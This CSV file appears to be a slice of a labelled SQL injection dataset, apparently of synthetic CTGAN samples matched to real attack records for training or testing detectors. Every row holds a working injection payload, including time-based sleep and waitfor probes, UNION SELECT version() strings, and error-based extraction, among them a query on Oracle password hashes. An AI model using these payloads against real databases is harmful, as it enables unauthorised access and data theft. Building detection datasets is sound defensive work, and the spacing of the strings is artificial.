id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000149,attack,time,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R003636,12.991008392240158
CTGAN_000150,attack,boolean,"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",nearest_attack_euclidean,R008681,6.080816174592106
CTGAN_000151,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000353,13.510576334584536
CTGAN_000152,attack,time, (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,nearest_attack_euclidean,R008405,8.041666360524319
CTGAN_000153,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000296,7.385566950981549
CTGAN_000154,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",nearest_attack_euclidean,R000727,6.1514562125885694
CTGAN_000155,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  3124  =  3124,nearest_attack_euclidean,R007890,13.882804526561417
CTGAN_000156,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R003983,12.66166443905193
CTGAN_000157,attack,boolean,"1 where 8949  =  8949 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R006881,4.389692688756979
CTGAN_000158,attack,boolean,"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",nearest_attack_euclidean,R000019,6.234494803618814
CTGAN_000159,attack,time,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671",nearest_attack_euclidean,R002369,16.125726876498963
CTGAN_000160,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R003160,6.355827042167275
CTGAN_000161,attack,other,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R001931,4.16617555365762
CTGAN_000162,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R001845,8.951506518610147
CTGAN_000163,attack,boolean,"1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001279,5.462949877475232
CTGAN_000164,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R005112,7.191461511821106
CTGAN_000165,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,27.26300045870212
CTGAN_000166,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000100,6.70345019339815
CTGAN_000167,attack,error,"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R005407,7.6011783289932895
CTGAN_000168,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,7.787371301345708
CTGAN_000169,attack,union,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",nearest_attack_euclidean,R005574,6.903764504286331
CTGAN_000170,attack,error,"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R002980,9.41041075679377
CTGAN_000171,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb",nearest_attack_euclidean,R006850,6.576494942669427
CTGAN_000172,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R002961,7.460670035149466
CTGAN_000173,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R002555,16.692409724963383
CTGAN_000174,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R008141,24.77861318601443
CTGAN_000175,attack,other,"1""  )   as ifgl where 2190  =  2190 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",nearest_attack_euclidean,R008617,10.622059310469314
CTGAN_000176,attack,error,"-4785""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000774,8.714929217090477
CTGAN_000177,attack,other,"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R006023,8.524597486329137
CTGAN_000178,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",nearest_attack_euclidean,R005291,3.9766691784045847
CTGAN_000179,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R002650,4.534291102663238
CTGAN_000180,attack,time,"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R004364,5.484814978303623
CTGAN_000181,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,nearest_attack_euclidean,R001274,4.954338143337674
CTGAN_000182,attack,other, (  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    ) ,nearest_attack_euclidean,R003862,4.17707842342191
CTGAN_000183,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R005040,7.713606294271211
CTGAN_000184,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R001334,5.6256491464969685
CTGAN_000185,attack,other,"make_set  (  6174  =  9734,1  )  ",nearest_attack_euclidean,R005136,6.603837044618864
CTGAN_000186,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000296,7.869059278358433
CTGAN_000187,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R005623,20.54143747530394
CTGAN_000188,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000613,7.5762217747030345
CTGAN_000189,attack,boolean,"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",nearest_attack_euclidean,R007326,3.972906599920881
CTGAN_000190,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R002765,18.07355598483713
CTGAN_000191,attack,other,select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R001931,6.466535320222214
CTGAN_000192,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000625,10.741341237033389
CTGAN_000193,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R005760,6.447060908940846
CTGAN_000194,attack,error,"1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R004158,5.861779042263441
CTGAN_000195,attack,other,1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,nearest_attack_euclidean,R003414,6.3146075080504716
CTGAN_000196,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R005880,6.491452967253002
CTGAN_000197,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R003450,9.012319853021145
CTGAN_000198,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000353,10.244216116863845
CTGAN_000199,attack,boolean,a' or 'a'   =   'a,nearest_attack_euclidean,R000584,8.527600243866921
CTGAN_000200,attack,boolean,"1  )   where 2888  =  2888 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006909,3.9059191485214173
